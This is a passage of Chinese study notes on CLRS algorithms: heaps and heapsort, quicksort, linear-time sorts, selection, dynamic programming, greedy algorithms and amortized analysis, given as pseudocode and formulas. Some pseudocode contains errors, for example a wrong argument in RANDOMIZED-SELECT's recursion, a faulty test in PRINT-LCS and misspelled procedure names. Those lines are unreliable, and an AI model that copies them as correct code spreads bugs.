`PERMUTE-BY-SORTING` 产生输入的均匀随机排列：\n```text\nPERMUTE-BY-SORTING(A)\nn = A.length\nlet P[1..n] be a new array\nfor i = 1 to n\n    P[i] = RANDOM(1, n^3)\nsort A, using P as sort keys\n```\n过程 `RANDOMIZE-IN-PLACE` 可计算出一个均匀随机排列：\n```text\nRANDOMIZE-IN-PLACE(A)\nn = A.length\nfor i = 1 to n\n    swap A[i] with A[RANDOM(i, n)]\n```\n## 排序和顺序统计量\n### 堆排序\n#### 堆\n**堆**是一个数组，它可以被看成一个近似的完全二叉树\n- 树上的每一个结点对应数组中的一个元素\n- 除了最底层外，该树是完全充满的\n- $A.length$表示数组元素的个数\n- $A.heap-size$表示有多少个堆元素存储在该数组中\n- $0 \\leq A.heap-size \\leq A.length$\n- 一个堆中的结点的**高度**就为该结点到叶结点最长简单路径上边的数目\n\n![heap](https://d-sketon.top/img/clrs-book/4.png)\n\n计算父结点、左孩子和右孩子的下标：\n```text\nPARENT(i)\n    return ⌊i/2⌋\n\nLEFT(i)\n    return 2i\n\nRIGHT(i)\n    return 2i + 1\n```\n在**最大堆**中，**最大堆性质**指除了根以外的所有结点$i$都要满足：\n$$A[PARENT(i)] \\geq A[i]$$\n\n在**最小堆**中，**最小堆性质**指除了根以外的所有结点$i$都要满足：\n$$A[PARENT(i)] \\leq A[i]$$\n\n#### 维护堆的性质\n假定根结点为 `LEFT(i)` 和 `RIGHT(i)` 的二叉树都是最大堆，`MAX-HEAPIFY` 通过让$A[i]$的值在最大堆中“逐级下降”，从而使得以下标$i$为根结点的子树重新遵循最大堆的性质：\n```text\nMAX-HEAPIFY(A, i)\nl = LEFT(i)\nr = RIGHT(i)\nif l <= A.heap-size and A[l] > A[i]\n    largest = l\nelse\n    largest = i\nif r <= A.heap-size and A[r] > A[largest]\n    largest = r\nif largest != i\n    exchange A[i] with A[largest]\n    MAX-HEAPIFY(A, largest)\n```\n因为每个孩子的子树的大小至多为$2n/3$（最坏情况发生在树的最底层恰好半满的时候），我们可以用下面递归式刻画 `MAX-HEAPIFY` 的运行时间：\n$$T(n) \\leq T(2n/3)+\\Theta(1) = O(lgn) = O(h)$$\n#### 建堆\n可以用自底向上的方法利用过程 `MAX-HEAPIFY` 把一个大小为$n=A.length$的数组$A[1..n]$转换为最大堆：\n```text\nBUILD-MAX-HEAP(A)\nA.heap-size = A.length\nfor i = ⌊A.length/2⌋ downto  1\n    MAX-HEAPIFY(A, i)\n```\n在一个高度为$h$的结点上运行 `MAX-HEAPIFY` 的代价是$O(h)$，我们可以将 `BUILD-MAX-HEAP` 的总代价表示为：\n$$\\sum^{\\lfloor lgn \\rfloor}_{h=0} \\lceil \\frac{n}{2^{h+1}} \\rceil O(h) = O(n \\sum^{\\lfloor lgn \\rfloor}_{h=0} \\frac{h}{2^h}) =  O(n \\sum^{\\infty}_{h=0} \\frac{h}{2^h}) =O(n)$$\n\n因此，我们可以在**线性时间**内，把一个无序数组构造成一个最大堆\n#### 堆排序算法\n`HEAPSORT` 过程的时间复杂度是$O(nlgn)$：\n```text\nHEAPSORT(A)\nBUILD-MAX-HEAP(A)\nfor i = A.length downto 2\n    exchange A[1] with A[i]\n    A.heap-size = A.heap-size - 1\n    MAX-HEAPIFY(A, 1)\n```\n#### 优先队列\n优先队列是一种用来维护由一组元素构成的集合$S$的数据结构，其中的每一个元素都有一个相关的值，称为关键字。一个最大优先队列支持以下操作：\n- `INSERT(S, x)`：把元素$x$插入集合$S$中\n- `MAXIMUM(S)`：返回$S$中具有最大键字的元素\n- `EXTRACT-MAX(S)`：去掉并返回$S$中的具有最大键字的元素\n- `INCREASE-KEY(S, x, k)`：将元素$x$的关键字增加到$k$，这里假设$k$的值不小于$x$的原关键字值\n\n优先队列可以用堆来实现：\n`HEAP-MAXMIUM` 时间复杂度$\\Theta(1)$：\n```text\nHEAP-MAXMIUM(A)\n    return A[1]\n```\n`HEAP-EXTRACT-MAX` 时间复杂度$O(lgn)$：\n```text\nHEAP-EXTRACT-MAX(A)\nif A.heap-size <  1 \n    error \"heap underflow\"\nmax = A[1]\nA[1] = A[A.heap-size]\nA.heap-size = A.heap-size - 1\nMAX-HEAPIFY(A, 1)\nreturn max\n```\n`HEAP-INCREASE-KEY` 时间复杂度$O(lgn)$：\n```text\nHEAP-INCREASE-KEY(A, i, key)\nif key < A[i]\n    error \"new key is smaller than current key\"\nA[i] = key\nwhile i > 1 and A[PARENT(i)] < A[i]\n    exchange A[i] with A[PARENT(i)]\n    i = PARENT(i)\n```\n`MAX-HEAP-INSERT` 时间复杂度$O(lgn)$：\n```text\nMAX-HEAP-INSERT(A, key)\nA.heap-size = A.heap-size + 1\nA[A.heap-size] = -∞\nHEAP-INCRERASE-KEY(A, A.heap-size, key)\n```\n### 快速排序\n#### 快速排序描述\n对一个子数组$A[p..r]$进行快速排序的三步分治过程：\n- **分解**：数组$A[p..r]$被划分为两个（可能为空）子数组$A[p..q-1]$和$A[q+1..r]$，使得$A[p..q-1]$中的每一个元素都小于等于$A[q]$，而$A[q]$也小于等于$A[q+1..r]$中的每个元素。其中，计算下标$q$也是划分过程的一部分\n- **解决**：通过递归调用快速排序，对子数组$A[p..q-1]$和$A[q+1..r]$进行排序\n- **合并**：因为子数组都是原址排序的，所以不需要合并操作：数组$A[p..r]$已经有序\n```text\nQUICKSORT(A, p, r)\nif p < r\n    q = PARTITION(A, p, r)\n    QUICKSORT(A, p, q-1)\n    QUICKSORT(A, q+1, r)\n```\n`PARTITION` 过程实现了对子数组$A[p..r]$的原址重排：\n```text\nPARTITION(A, p, r)\nx = A[r]\ni = p - 1\nfor j = p to r-1\n    if A[j] <= x\n        i = i + 1\n        exchange A[i] with A[j]\nexchange A[i+1] with A[r]\nreturn i+1\n```\n\n![partition](https://d-sketon.top/img/clrs-book/5.png)\n\n#### 快速排序性能\n##### 最坏情况划分\n当划分产生的两个子问题分别包含了$n-1$个元素和0个元素时，为最坏情况\n此时算法递归式可以表示为：\n$$T(n)=T(n-1)+T(0)+\\Theta(n) =T(n-1) + \\Theta(n) = \\Theta(n^2)$$\n##### 最好情况划分\n在可能的最平衡的划分中，`PARTITION` 得到的两个子问题的规模都不大于$n/2$\n此时算法递归式可以表示为：\n$$T(n)=2T(n/2)+\\Theta(n)=\\Theta(nlgn)$$\n##### 平衡的划分\n任何一种**常数比例**的划分都会产生深度为$\\Theta(lgn)$的递归树，其中每一层的时间代价都是$O(n)$\n因此，只要划分是**常数比例**的，算法的运行时间总是$O(nlgn)$\n##### 对于平均情况的直观观察\n当好和差的划分交替出现时，快速排序的时间复杂度与全是好的划分时一样，仍然是$O(nlgn)$。区别只是$O$符号中隐含的常数因子要略大一些\n#### 快速排序随机化版本\n通过对序列$p,..,r$的随机抽样，我们期望在平均情况下，对输入数组的划分是比较均衡的：\n```text\nRANDOMIZED-PARTITION(A, p, r)\ni = RANDOM(p, r)\nexchange A[r] with A[i]\nreturn PARTITION(A, p, r)\n```\n```text\nRANDOMIZED-QUICKSORT(A, p, r)\nif p < r\n    q = RANDOMIZED-PARTITION(A, p, r)\n    RANDOMIZED-QUICKSORT(A, p, q-1)\n    RANDOMIZED-QUICKSORT(A, q+1, r)\n```\n#### 快速排序分析\n##### 最坏情况分析\n快速排序的最坏情况运行时间是$\\Theta(n^2)$\n##### 期望运行时间\n快速排序的期望运行时间是$O(nlgn)$\n### 线性时间排序\n#### 排序算法的下界\n##### 决策树模型\n比较排序可以被抽象为一棵**决策树**\n**决策树**是一棵完全二叉树，它可以表示在给定输入规模情况下，某一给定排序算法对所有元素的比较操作\n在决策树中，每个内部结点都以$i:j$标记，其中$i$和$j$满足$1 \\leq i,j \\leq n$，$n$是输入序列中的元素个数\n每一个内部结点表示一次比较$a_i \\leq a_j$\n- 左子树表示一旦我们确定$a_i \\leq a_j$之后的后续比较\n- 右子树表示一旦我们确定$a_i > a_j$之后的后续比较\n\n对于一个正确的比较排序算法来说，$n$个元素的$n!$种可能的排列都应该出现在决策树的叶结点上。而且，每一个叶结点都必须是可以从根结点经由某条路径到达的\n\n![decisionTree](https://d-sketon.top/img/clrs-book/6.png)\n\n##### 最坏情况的下界\n在最坏情况下，任何比较排序算法都需要做$\\Omega(nlgn)$次比较：\n考虑一棵高度为$h$，具有$l$个可达叶结点的决策树，它对应一个对$n$个元素所做的比较排序。因为输入数据的$n!$种可能的排列都是叶结点，所以有$n! \\leq l$。由于在一个高度为$h$的二叉树中，叶结点的数目 不多于$2^h$，所以有：\n$$n! \\leq l \\leq 2^h$$\n\n对该式两边取对数，有$h \\geq lg(n!) = \\Omega(nlgn)$\n#### 计数排序\n计数排序假设$n$个输入元素中的每一个都是在0到$k$区间内的一个**整数**，其中$k$为某个整数。当$k=O(n)$时，排序的运行时间为$\\Theta(n)$\n\n在计数排序的代码中，假设输入是一个数组$A[1..n]$，$A.length = n$，$B[1..n]$存放排序的输出，$C[0..k]$提供临时存储空间：\n```text\nCOUNTING-SORT(A, B, k)\nlet C[0..k] be a new array\nfor i = 0 to k\n    C[i] = 0\nfor j = 1 to A.length\n    C[A[j]] = C[A[j]] + 1\nfor i = 1 to k\n    C[i] = C[i-1] + C[i]\nfor j = A.length downto 1\n    B[C[A[j]]] = A[j]\n    C[A[j]] = C[A[j]] - 1\n```\n计数排序时间复杂度$\\Theta(k+n)$，当$k=O(n)$时，时间复杂度$\\Theta(n)$\n#### 基数排序\n假设$n$个$d$位的元素存放在数组$A$中，其中第1位是最低位，第$d$位是最高位：\n```text\nRADIX-SORT(A, d)\nfor i = 1 to d\n    use a stable sort to sort array A on digit i\n```\n给定一个$b$位数和任何正整数$r\\leq b$，如果 `RADIX-SORT` 使用的稳定排序算法对数据取值区间是0到$k$的输入进行排序耗时$\\Theta(n+k)$，那么它就可以在$\\Theta((b/r)(n+2^r))$时间内将这些数据排好序\n#### 桶排序\n桶排序假设输入数据服从均匀分布，平均情况下它的时间代价为$O(n)$\n\n假设输入是一个包含$n$个元素的数组$A$，且每个元素$A[i]$满足$0 \\leq A[i] < 1$。算法还需要一个临时数组$B[0..n-1]$来存放链表（即桶），并假设存在一种用于维护这些链表的机制：\n```text\nBUCKET-SORT(A)\nn = A.length\nlet B[0..n-1] be a new array\nfor i = 0 to n-1\n    make B[i] an empty list\nfor i = 1 to n\n    insert A[i] into list B[⌊nA[i]⌋]\nfor i = 0 to n-1\n    sort list B[i] with insertion sort\nconcatenate the lists B[0]..B[n-1] together in order\n```\n桶排序的期望运行时间为：\n$$\\Theta(n)+n \\cdot O(2-1/n) = \\Theta(n)$$\n\n### 中位数和顺序统计量\n#### 最小值和最大值\n假设该集合元素存放在数组$A$中，且$A.length = n$：\n```text\nMINIMUM(A)\nmin = A[1]\nfor i = 2 to A.length\n    if min > A[i]\n        min = A[i]\nreturn min\n```\n为了确定最小值，必须要做$n-1$次比较\n##### 同时找到最小值和最大值\n最多$3\\lfloor n/2 \\rfloor$次比较就可以同时找到最小值和最大值：\n首先，我们将一对输入元素相互进行比较，然后把较小的与当前最小值比较，把较大的与当前最大值进行比较。这样，对每两个元素共需3次比较：\n- 如果$n$是**奇数**，我们就将最小值和最大值的初值设为第一个元素的值，然后成对地处理余下的元素\n- 如果$n$是**偶数**，就对前两个元素做一次比较，以决定最小值和最大值的初值，然后成对处理余下的元素\n#### 期望为线性时间的选择算法\n`RANDOMIZED-SELECT` 返回数组$A[p..r]$中第$i$小的元素：\n```text\nRANDOMIZED-SELECT(A, p, r, i)\nif p == r\n    return A[p]\nq = RANDOMIZE-PARTITOOPN(A, p, r)\nk = q - p + 1\nif i == k\n    return A[q]\nelse if i < k\n    return RANDOMIZED-SELECT(A, p, q-1, r)\nelse \n    return RANDOMIZED-SELECT(A, q+1, r, i-k)\n```\n`RANDOMIZED-SELECT` 的最坏情况运行时间为$\\Theta(n^2)$，期望运行时间为$\\Theta(n)$\n#### 最坏情况为线性时间的选择算法\n通过执行下列步骤，算法 `SELECT` 可以确定一个有$n>1$个不同元素的输入数组中的第$i$小的元素\n- 将输入数组的$n$个元素划分为$\\lfloor n/5 \\rfloor$组，每组5个元素，且至多只有一组由剩下的$n \\ mod \\ 5$个元素组成\n- 寻找这$\\lceil n/5 \\rceil$组中每一组的中位数：首先对每组元素进行插入排序，然后确定每组有序元素的中位数\n- 对第2步中找出的$\\lceil n/5 \\rceil$个中位数，递归调用 `SELECT` 以找出其中位数$x$（如果有偶数个中位数，为了方便，约定$x$是较小的中位数）\n- 利用修改过的 `PARTITION` 版本，按中位数的中位数$x$对输入数组进行划分。让$k$比划分的低区中的元素数目多1，因此$x$是第$k$小的元素，并且有$n-k$个元素在划分的高区\n- 如果$i=k$，则返回$x$。如果$i<k$，则在低区递归调用 `SELECT` 来找出第$i$小的元素。如果$i>k$，则在高区递归查找第$i-k$小的元素\n\n![select](https://d-sketon.top/img/clrs-book/7.png)\n\n在第2步找出的中位数中，至少有一半大于或等于中位数的中位数$x$。因此，在这$\\lceil n/5 \\rceil$个组中，除了当$n$不能被5整除时产生的所含元素少于5的那个组和包含$x$的那个组之外，至少有一半的组中有3个元素大于$x$。不算这两个组，大于$x$的元素个数至少为：\n$$3(\\lceil \\frac{1}{2} \\lceil \\frac{n}{5} \\rceil\\rceil - 2) \\geq \\frac{3n}{10}-6$$\n\n类似地，至少有$3n/10-6$个元素小于$x$。因此，在最坏情况下，在第5步中，`SELECT` 的递归调用最多作用于$7n/10+6$个元素。\n由此可以得到如下递归式：\n$$\nT(n) \\leq\n\\begin{cases}\n\\Theta(1) \\qquad & n < 140 \\\\\nT(\\lceil n/5 \\rceil) + T(7n/10+6) + O(n) \\qquad &  n\\geq 140\n\\end{cases} = O(n)\n$$\n\n## 高级设计和分析技术\n### 动态规划\n我们通常按如下4个步骤来设计一个动态规划算法：\n- 刻画一个最优解的结构特征\n- 递归地定义最优解的值\n- 计算最优解的值，通常采用自底向上的方法\n- 利用计算出的信息构造一个最优解\n#### 钢条切割\n给定一段长度为$n$英寸的钢条和一个价格表$p_i(i=1,2,...,n)$，求切割钢条方案，使得销售收益$r_n$最大\n\n自顶向下 `CUT-ROD`过程，加入了备忘机制，时间复杂度$\\Theta(n^2)$：\n```text\nMEMORIZED-CUT-ROD(p, n)\nlet r[0..n] be a new array\nfor i = 0 to n\n    r[i] = -∞\nreturn MEMORIZED-CUT-ROD-AUX(p, n, r)\n\nMEMORIZED-CUT-ROD-AUX(p, n, r)\nif r[n] >=0\n    return r[n]\nif n == 0\n    q = 0\nelse \n    q = -∞\n    for i = 1 to n\n    q = max(q, p[i] + MEMORIZED-CUT-ROD-AUX(p, n-i, r))\nr[n] = q\nreturn q\n```\n自底向上版本，时间复杂度$\\Theta(n^2)$：\n```text\nBOTTOM-UP-CUT-ROD(p, n)\nlet r[0..n] be a new array\nr[0] = 0\nfor j = 1 to n\n    q = -∞\n    for i = 1 to j\n        q = max(q, p[i] + r[j-i])\n    r[j] = q\nreturn r[n]\n```\n##### 重构解\n`BOTTOM-UP-CUT-ROD` 的扩展版本，它对长度为$j$的钢条不仅计算最大收益值$r_j$，还保存最优解对应的第一段钢条的切割长度$s_j$：\n```text\nEXTENDED-BOTTOM-UP-CUT-ROD(p, n)\nlet r[0..n] and s[0..n] be new arrays\nr[0] = 0\nfor j = 1 to n\n    q = -∞\n    for i = 1 to j\n        if q < p[i] + r[j-i]\n            q = p[i] + r[j-i]\n            s[j] = i\n    r[j] = q\nreturn r and s\n```\n最后输出长度为$n$的钢条的完整的最优切割方案：\n```text\nPRINT-CUT-ROD-SOLUTION(p, n)\n(r, s) = EXTENDED-BOTTOM-UP-CUT-ROD(p, n)\nwhile n > 0\n    print s[n]\n    n = n - s[n]\n```\n#### 矩阵链乘法\n给定一个$n$个矩阵的序列（矩阵链）$\\langle A_1,A_2,...,A_n\\rangle$，我们希望计算它们的乘积：\n$$A_1A_2...A_n$$\n\n由于矩阵乘法满足结合律，因此任何加括号的方法都会得到相同的计算结果\n\n我们称有如下性质的矩阵乘积链为**完全括号化的**：它是单一矩阵，或者是两个完全括号化的矩阵乘积链的积\n给定$n$个矩阵的链$\\langle A_1,A_2,...,A_n\\rangle$，矩阵$A_i$的规模为$p_{i-1} * p_i(1 \\leq i \\leq n)$，求完全括号化方案，使得计算乘积$A_1A_2...A_n$所需标量乘法次数最少\n\n令$m[i,j]$表示计算矩阵$A_{i..j}$所需标量乘法次数的最小值，则$A_iA_{i+1}...A_j$最小代价括号化方案的递归求解公式为：\n$$\nm[i,j] \\leq\n\\begin{cases}\n0 \\qquad & i = j \\\\\nmin_{i \\leq k < j}\\{m[i,k]+m[k+1,j]+p_{i-1}p_kp_j\\} \\qquad & i <j\n\\end{cases} \n$$\n\n`MATRIX-CHAIN-ORDER` 时间复杂度$O(n^3)$，另外还需要$\\Theta(n^2)$的内存空间来保存表$m$和$s$：\n```text\nMATRIX-CHAIN-ORDER(p)\nn = p.length - 1\nlet m[1..n,1..n] and s[1..n-1,2..n] be new tables\nfor i = 1 to n\n    m[i,i] = 0\nfor l = 2 to n  //l is the chain length\n    for i = 1 to n-l+1\n        j = i + l - 1\n        m[i,j] = ∞\n        for k = i to j-1\n            q = m[i, k] + m[k+1, j] + p_i-1p_kp_j\n            if q < m[i,j]\n                m[i,j] = q\n                s[i,j] = k\nreturn m and s\n```\n调用 `PRINT-OPTIMAL-PARENS` 可输出$\\langle A_1,A_2,...,A_n\\rangle$的最优括号化方案：\n```text\nPRINT-OPTIMAL-PARENS(s, i, j)\nif i == j\n    print \"A\"\nelse \n    print \"(\"\n    PRINT-OPTIMAL-PARENS(s, i, s[i,j])\n    PRINT-OPTIMAL-PARENS(s, s[i,j]+1, j)\n    print \")\"\n```\n#### 最长公共子序列（LCS）\n给定一个序列$X = \\langle x_1,x_2...x_m\\rangle$，令一个序列$Z=\\langle z_1,z_2,...,z_k\\rangle$满足如下条件时称为$X$的**子序列**：存在一个严格递增的$X$的下标序列$\\langle i_1,i_2,...,i_k\\rangle$，对所有$j=1,2,...,k$，满足$x_i=z_j$\n给定两个序列$X = \\langle x_1,x_2...x_m\\rangle$和$Y =\\langle y_1,y_2,...,y_n\\rangle$，求$X$和$Y$长度最长的公共子序列\n\n我们定义$c[i,j]$表示$X_i$和$Y_j$的 `LCS` 的长度，可得如下公式：\n$$\nc[i,j] \\leq\n\\begin{cases}\n0 \\qquad & i = 0 \\lor j = 0 \\\\\nc[i-1,j-1]+1 \\qquad & i,j >0 \\land x_i = y_i \\\\\nmax(c[i,j-1],c[i-1,j]) & i,j >0 \\land x_i \\neq y_i\n\\end{cases} \n$$\n\n`LCS-LENGTH` 时间复杂度$\\Theta(mn)$：\n```text\nLCS-LENGTH(X, Y)\nm = X.length\nn = Y.length\nlet b[1..m,1..n] and c[0..m,0..n] be new tables\nfor i = 1 to m\n    c[i,0] = 0\nfor j = 0 to n\n    c[0,j] = 0\nfor i = 1 to m\n    for j = 1 to n\n        if xi == yj\n            c[i,j] = c[i-1,j-1] + 1\n            b[i,j] = \"↖\"\n        elseif c[i-1,j] >= c[i,j-1]\n            c[i,j] = c[i-1,j]\n            b[i,j] = \"↑\"\n        else \n            c[i,j] = c[i,j-1]\n            b[i,j] = \"←\"\nreturn c and b\n```\n调用 `PRINT-LCS` 可打印出$X$和$Y$的一个 `LCS`：\n```text\nPRINT-LCS(b, X, i, j)\nif x == 0 or j == 0\n    return\nif b[i,j] == \"↖\"\n    PRINT-LCS(b, X, i-1, j-1)\n    print xi\nelseif b[i,j] == \"↑\"\n    PRINT-LCS(b, X, i-1, j)\nelse\n    PRINT-LCS(b, X, i, j-1)\n```\n#### 最优二叉搜索树\n给定一个$n$个不同关键字的已排序的序列$K=\\langle k_1,k_2,...,k_n \\rangle ,k_1<k_2<...<k_n$，我们希望用这些关键字构造一棵二叉搜索树，对每个关键字$k_i$，都有一个概率$p_i$表示其搜索频率。有些要搜索的值可能不在$K$中，因此我们还有$n+1$个“伪关键字”$d_0,d_1,...,d_n$表示不在$K$中的值。$d_0$表示所有小于$k_1$的值，$d_n$表示所有大于$k_n$的值，对$i=1,2,...,n-1$，伪关键字$d_i$表示所有在$k_i$和$k_{i+1}$之间的值。对每个伪关键字$d_i$，也都有一个概率$q_i$表示对应的搜索频率。每个关键字$k_i$是一个内部结点，而每个伪关键字$d_i$是一个叶结点：\n\n![binaryTree](https://d-sketon.top/img/clrs-book/8.png)\n\n有如下公式：\n$$\\sum^{n}_{i=1}p_i+\\sum^n_{i=0}q_i=1$$\n\n在$T$中进行一次搜索的期望代价为：\n$$E[cost]=1+\\sum^{n}_{i=1}depth_T(k_i) \\cdot p_i + \\sum^n_{i=0}depth_T(d_i) \\cdot q_i$$\n\n对于一个给定的概率集合。我们希望构造一棵期望搜索代价最小的二叉搜索树，我们称为**最优二叉搜索树**\n\n定义$e[i,j]$为在包含关键字$k_i,...,k_j$的最优二叉搜素树中进行一次有所的期望代价，其中$i \\geq i$，$j \\leq n$且$j\\geq i-1$（当$j=i-1$时，子树不包含实际关键字，只包含伪关键字$d_{i-1}$）\n\n当一棵子树成为一个结点的子树时，对于包含关键字$k_i,..k_j$的子树，子树的期望搜索代价的增加值为：\n$$\nw(i,j)=\\sum^j_{l=i}p_l+\\sum^j_{l=i-1}q_l\n$$\n\n递归公式：\n$$\ne[i,j] \\leq\n\\begin{cases}\nq_{i-1} \\qquad & j=i-1 \\\\\nmin_{i \\leq r \\leq j}\\{e[i,r-1]+e[r+1,j]+w(i,j)\\} \\qquad  & i \\leq j\n\\end{cases} \n$$\n\n`OPTIMAL-BST` 时间复杂度$\\Theta(n^3)$：\n```text\nOPTIMAL-BST(p, q, n)\nlet e[1..n+1,0..n],w[1..n+1,0..n] and root[1..n,1..n] be new tables\nfor i = 1 to n+1\n    e[i,i-1] = q_{i-1}\n    w[i,i-1] = q_{i-1}\nfor l = 1 to n\n    for i = 1 to n-l+1\n        j = i+l-1\n        e[i,j] = ∞\n        w[i,j] = w[i,j-1] + p_j +q_j\n        for r = i to j\n            t = e[i,r-1] + e[r+1,j] + w[i,j]\n            if t < e[i,j]\n                e[i,j] = t\n                root[i,j] = r\nreturn e and root\n```\n### 贪心算法\n#### 活动选择问题\n假定有一个$n$个**活动**的集合$S=\\{a_1,a_2,...,a_n\\}$。这些活动使用同一个资源，而这个资源在某个时刻只能供一个活动使用。每个活动$a_i$都有一个**开始时间**$s_i$和**结束时间**$f_i$，其中$0\\leq s_i < f_i < \\infty$。如果被选中，任务$a_i$发生在半开时间区间$[s_i,f_i)$期间。如果两个活动$a_i$和$a_j$满足$[s_i,f_i)$和$[s_j,f_j)$不重叠，则称它们是**兼容**的\n\n在**活动选择问题**中，我们希望选出一个**最大兼容活动集**，假定活动已按结束时间的单调递增顺序排列：\n$$f_1\\leq f_2 \\leq .. \\leq f_{n-1} \\leq f_n$$\n\n##### 最优子结构\n用$c[i,j]$表示集合$S_{ij}$的最优解的大小，则可得递归式：\n$$\nc[i,j] \\leq\n\\begin{cases}\n0 \\qquad & S_{ij} = \\emptyset \\\\\nmax_{a_k \\in S_{ij}}\\{c[i,k]+c[k,j]+1\\} \\qquad  & S_{ij} \\neq \\emptyset\n\\end{cases} \n$$\n\n##### 贪心选择\n考虑任意非空子问题$S_k$，令$a_m$是$S_k$中结束时间最早的活动，则$a_m$在$S_k$的某个最大兼容活动子集中\n##### 递归贪心算法\n求解原问题可调用 `RECURSIVE-ACTIVITY-SELECTOR(s, f, 0, n)`，在输入活动已按结束时间排序的前提下，时间复杂度$\\Theta(n)$：\n```text\nRECURSIVE-ACTIVITY-SELECTOR(s, f, k, n)\nm = k + 1\nwhile m <= n and s[m] < f[k]\n    m = m + 1\nif m <= n\n    return {a_m} ∪ RECURSIVE-ACTIVITY-SELECTOR(s, f, m, n)\nelse\n    return ∅\n```\n##### 迭代贪心算法\n在输入活动已按结束时间排序的前提下，时间复杂度$\\Theta(n)$：\n```text\nGREEDY-ACTIVITY-SELECTOR(s, f)\nn = s.length\nA = {a_1}\nk = 1\nfor m = 2 to n\n    if s[m] >= f[k]\n        A = A ∪ {a_m}\n        k = m\nreturn A\n```\n#### 霍夫曼编码\n##### 前缀码\n前缀码，即没有任何码字是其他码字的前缀。前缀码可以保证达到最优数据压缩率\n\n使用**二叉树**来表示前缀码：其叶结点为给定的字符。字符的二进制码字用从根结点到该字符叶结点的简单路径表示。其中 `0` 意味着“转向左孩子”，`1` 意味着“转向右孩子”：\n\n![Huffman](https://d-sketon.top/img/clrs-book/9.png)\n\n文件的最优编码方案总是对应一棵满二叉树，即每个非叶结点都有两个孩子结点\n若$C$为字母表且所有字符的出现频率为正数，则最优前缀码对应的树恰好有$|C|$个叶结点，每个叶结点对应字母表中的一个字符，且恰有$|C|-1$个内部结点\n\n给定一棵对应前缀码的树$T$。对于字母表$C$中的每个字符$c$，令属性$c.freq$表示$c$在文件中出现的频率，令$d_T(c)$表示$c$的叶结点在树中的深度。则编码文件需要：\n$$B(T)=\\sum_{c \\in C} c.freq \\cdot d_T(c)$$\n\n个二进制位，我们将$B(T)$定义为$T$的代价\n##### 构造霍夫曼编码\n假定$C$是一个$n$个字符的集合，而其中每个字符$c \\in C$都是一个对象，其属性$c.freq$给出了字符的出现频率。算法使用了一个以属性$freq$为关键字最小优先队列$Q$：\n```text\nHUFFMAN(C)\nn = |C|\nQ = C\nfor i = 1 to n-1\n    allocate a new node z\n    z.left = x = EXTRACT-MIN(Q)\n    z.right = y = EXTRACT-MIN(Q)\n    z.freq = x.freq + y.freq\n    INSERT(Q, z)\nreturn EXTRACT-MIN(Q)\n```\n假定$Q$是使用最小二叉堆实现，`HUFFMAN` 时间复杂度$O(nlgn)$\n如果将最小二叉堆换为 `van Emde Boas` 树，时间复杂度$O(nlglgn)$\n### 摊还分析\n#### 聚合分析\n这种方法用来确定一个$n$个操作的序列的总代价的上界$T(n)$。因而每个操作的平均代价为$T(n)/n$。我们将平均代价作为每个操作的摊还代价，因此所有操作具有相同的摊还代价\n##### 栈操作\n考虑由$n$个 `PUSH`、`POP` 和 `MULTIPOP` 组成的操作序列在一个空栈上的执行情况。其代价至多为$O(n)$，一个操作的平均时间为$O(n)/n=O(1)$。所以，所有三种栈操作的摊还代价都是$O(1)$\n##### 二进制计数器递增\n我们用一个位数组$A[0..k-1]$作为计数器，其中$A.length = k$。当计数器中保存的二进制值为$x$时，$x$的最低位保存在$A[0]$中，而最高位保存在$A[k-1]$中。初始时$x=0$，因此对所有$i=0,1,..,k-1$，$A[i]=0$。为了将1（模$2^k$）加到计数器的值上，我们使用如下过程：\n```text\nINCEREMENT(A)\ni = 0\nwhile i < A.length and A[i] == 1\n    A[i] = 0\n    i = i + 1\nif i < A.length\n    A[i] = 1\n```\n一般地，对一个初值为0的计数器，在执行一个由$n$个 `INCEREMENT` 操作组成的序列的过程中，$A[i]$会翻转$\\lfloor n/2^i \\rfloor$次。总翻转次数为：\n$$\\sum^{k-1}_{i=0}\\lfloor \\frac{n}{2^i} \\rfloor < n \\sum^{\\infty}_{i=0}\\frac{1}{2^i}=2n$$\n\n因此，对一个初值为0的计数器，执行一个$n$个 `INCEREMENT` 操作的序列的最坏情况时间为$O(n)$。每个操作的平均代价，即摊还代价为$O(n)/n=O(1)$\n#### 核算法\n用核算法进行摊还分析时，我们对不同操作赋予不同费用，赋予某些造成的费用可能多于或少于其实际代价。我们将赋予一个操作的费用称为它的**摊还代价**\n当一个操作的摊还代价超出其实际代价时，我们将差额存入数据结构中的特定对象，存入的差额称为**信用**\n对于后续操作中摊还代价小于实际代价的情况，信用可以用来支付差额\n\n如果用$c_i$表示第$i$个操作的真实代价，用$\\hat{c_i}$表示其摊还代价，则对任意$n$个操作的序列，要求：\n$$\\sum^n_{i=1} \\hat{c_i} \\geq \\sum^n_{i=1}c_i$$\n即数据结构所关联的信用必须一直为非负值\n##### 栈操作\n为操作赋予如下摊还代价：\n|操作|代价|\n|-|-|\nPUSH|2\nPOP|0\nMULTIPOP|0\n\n用1美元支付压栈操作的实际代价，将剩余1美元存为信用，用来支付将来出栈操作的代价\n由于栈中的每个元素都存有1美元的信用，而栈中的元素始终是非负的，因此可以保证总信用值是非负的\n因此，对任意$n$个 `PUSH`、`POP` 和 `MULTIPOP` 操作组成的序列，总摊还代价为总实际代价的上界由于总摊还代价为$O(n)$，总实际代价也是$O(n)$\n##### 二进制计数器递增\n为操作赋予如下摊还代价：\n|操作|代价|\n|-|-|\n一次置位操作|2\n\n当进行置位时，用1美元支付置为操作的实际代价，另1美元存为信用，用来支付将来复位操作的代价\n由于每位都存有1美元的信用，而计数器中1的个数始终是非负的，因此可以保证总信用值是非负的\n因此，对任意$n$个 `INCREMENT` 操作，总摊还代价为总实际代价的上界。由于总摊还代价为$O(n)$，总实际代价也是$O(n)$\n#### 势能法\n我们将对一个初始数据结构$D_0$执行$n$个操作。对每个$i=1,2,...,n$，令$c_i$为第$i$个操作的实际代价，令$D_i$为在数据结构$D_{i-1}$上执行第$i$个操作得到的结果数据结构。**势函数**$\\Phi$将每个数据结构$D_i$映射到一个实数$\\Phi(D_i)$，此值即为关联到数据结构$D_i$的势。第$i$个操作的**摊还代价**$\\hat{c_i}$用势函数$\\Phi$定义为：\n$$\\hat{c_i}=c_i+\\Phi(D_i)-\\Phi(D_{i-1})$$\n\n$n$个操作的总摊还代价为：\n$$\\sum^n_{i=1} \\hat{c_i} = \\sum^n_{i=1}(c_i+\\Phi(D_i)-\\Phi(D_{i-1}))=\\sum^n_{i=1}c_i+\\Phi(D_n)-\\Phi(D_0)$$\n\n如果能定义一个势函数$\\Phi$，使得$\\Phi(D_n) \\geq \\Phi(D_0)$，则总摊还代价$\\sum^n_{i=1} 